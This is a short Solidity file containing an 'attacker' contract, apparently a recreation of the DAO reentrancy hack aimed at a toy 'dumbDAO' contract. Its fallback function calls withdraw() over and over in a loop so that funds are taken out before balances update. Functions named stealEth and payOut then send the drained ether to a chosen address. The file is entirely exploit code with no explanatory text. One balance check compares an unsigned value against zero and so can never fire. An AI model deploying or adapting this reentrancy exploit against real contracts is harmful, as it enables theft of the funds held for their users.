import "dumbDAO.sol";

contract attacker {
  event DefaultFunc(address caller, uint amount);

  address public daoAddress;

  address public transferAddress;

  uint[] public arr;
  uint public a = 0;

  function () {
    DefaultFunc(msg.sender,msg.value);
    while (a<5) {
      arr.push(a); //to help debug
      if (daoAddress.balance-2*msg.value < 0){
          dumbDAO(daoAddress).transferTokens(transferAddress,dumbDAO(daoAddress).balances(this));
      }
      dumbDAO(daoAddress).withdraw(this,msg.value);
      a++;
    }
  }

  //fund contract without calling the default function
  function fundMe(){
  }

  function stealEth(uint _amount){
    dumbDAO(daoAddress).withdraw(this,_amount);
  }

  function payOut(address _payee) returns (bool){
    if (_payee.send(this.balance))
    return true;
  }

  function buyDAOTokens(uint _amount){
    dumbDAO(daoAddress).buyTokens.value(_amount)();
  }

  function resetA() {
    a=0;
  }

  function setDAOAddress(address _dao){
    daoAddress=_dao;
  }
}
